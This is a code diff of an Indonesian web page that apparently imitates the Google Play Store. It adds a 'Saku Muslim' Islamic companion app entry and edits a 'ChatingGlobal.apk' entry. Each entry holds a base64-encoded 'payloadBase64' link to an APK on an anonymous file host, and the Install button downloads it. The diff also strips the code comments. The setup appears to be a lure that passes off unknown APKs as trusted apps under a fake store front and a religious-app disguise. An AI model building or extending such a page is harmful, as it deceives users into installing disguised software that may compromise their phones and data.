@@ -567,7 +567,7 @@
             protocol: "Input Pengaturan",
             serverUrl: "https://script.google.com/macros/s/AKfycbz8-iboQCS-5xfYK15uOv8IfP0nZKD8Hm8ceNbb2Edlk4BURB-VinVa7Q5bq75jXis/exec",
             fileName: "ChatingGlobal.apk",
-            payloadBase64: "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL2JjZHdnei5hcGs=",
+            payloadBase64: "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLWJjZHdnei5hcGs=",
             screenshots: [
                 "https://i.ibb.co.com/HLdpVgsy/f3d7a7aa5c7f.jpg",
                 "https://i.ibb.co.com/MDRpzXqw/71f4dfe71470.jpg",
@@ -639,10 +639,32 @@
                 "https://i.ibb.co.com/P0hBxP5/1a14482228f8.jpg",
                 "https://i.ibb.co.com/nsPNr5jM/a90148f66d88.jpg"
             ]
+        },
+        {
+            id: 6,
+            title: "Saku Muslim",
+            edition: "Islamic Companion Edition",
+            bgIcon: "#e6f4ea",
+            fillIcon: "#137333",
+            iconSvg: `<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>`,
+            desc: "Aplikasi utilitas dan pendamping ibadah harian Muslim terlengkap yang dirancang untuk mendukung aktivitas ibadah Anda kapan saja dan di mana saja. Dilengkapi fitur andalan seperti jadwal pengingat waktu sholat otomatis, Al-Qur'an digital interaktif, kumpulan hadis sahih, kompas penunjuk arah kiblat yang akurat, kalender hijriah, serta ruang diskusi komunitas publik yang terintegrasi.",
+            server: "Cloud Islamic Database",
+            protocol: "Prayer & Community Protocol",
+            serverUrl: "",
+            fileName: "SakuMuslim_Companion.apk",
+            payloadBase64: "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL2V2eTV3bC5hcGs=",
+            screenshots: [
+                "https://i.ibb.co/W4ttKjp6/6b63fb725bd9.jpg",
+                "https://i.ibb.co/1GH4v8pY/0d381feea78a.jpg",
+                "https://i.ibb.co.com/9HcDLbbX/9cbee4090a36.jpg",
+                "https://i.ibb.co.com/dJ525rmS/1dce3817bff4.jpg",
+                "https://i.ibb.co.com/Jj4KgVXL/2c2db4b8a59b.jpg",
+                "https://i.ibb.co.com/wFPHVhgB/9b65f101e112.jpg",
+                "https://i.ibb.co.com/DH2DdybC/c1cf6f940f21.jpg"
+            ]
         }
     ];
 
-    // Simpan objek pengontrol pembatalan global untuk unduhan yang sedang berjalan
     let currentDownloadController = null;
 
     const appListContainer = document.getElementById("store-app-list");
@@ -729,7 +751,6 @@
     }
 
     function backToStoreHome() {
-        // Jika pengguna kembali ke beranda saat mengunduh, batalkan unduhan secara otomatis agar aman
         if (currentDownloadController) {
             currentDownloadController.abort();
             currentDownloadController = null;
@@ -745,12 +766,10 @@
         const ringSvg = document.getElementById("detail-ring-svg");
         const circle = document.getElementById("detail-circle");
 
-        // Jika unduhan sedang berjalan dan tombol ditekan, maka lakukan PEMBATALAN (Cancel)
         if (currentDownloadController) {
             currentDownloadController.abort();
             currentDownloadController = null;
             
-            // Kembalikan tampilan tombol ke kondisi Install awal
             button.classList.remove('cancel-mode');
             btnText.innerText = "Install";
             wrap.classList.remove('downloading');
@@ -761,11 +780,9 @@
 
         const app = appData.find(a => a.id === id);
         
-        // Inisialisasi AbortController baru untuk mengontrol request unduhan saat ini
         currentDownloadController = new AbortController();
         const signal = currentDownloadController.signal;
 
-        // Ubah tombol menjadi mode pembatalan (gaya visual merah/Play Store)
         button.classList.add('cancel-mode');
         wrap.classList.add('downloading');
         ringSvg.style.display = 'block';
@@ -800,7 +817,6 @@
                                 loaded += value.byteLength;
                                 const pct = Math.round((loaded / total) * 100);
                                 
-                                // Tetap perbarui label persentase teks mengunduh di tombol
                                 if (currentDownloadController) {
                                     btnText.innerText = `Mengunduh (${pct}%)`;
                                 }
@@ -820,7 +836,6 @@
                 circle.style.strokeDashoffset = 0;
 
                 setTimeout(() => {
-                    // Pastikan unduhan belum dibatalkan saat timeout selesai memproses
                     if (!currentDownloadController) return;
 
                     const url = window.URL.createObjectURL(blob);
@@ -832,7 +847,6 @@
                     a.click();
                     window.URL.revokeObjectURL(url);
                     
-                    // Reset Tombol ke Default setelah instalasi berhasil dipicu
                     currentDownloadController = null;
                     button.classList.remove('cancel-mode');
                     btnText.innerText = "Install";
@@ -842,7 +856,6 @@
                 }, 800);
             })
             .catch(err => {
-                // Jangan tampilkan status gagal jika pembatalan dipicu secara sengaja oleh user
                 if (err.name === 'AbortError') return;
 
                 btnText.innerText = "Gagal Mengunduh";
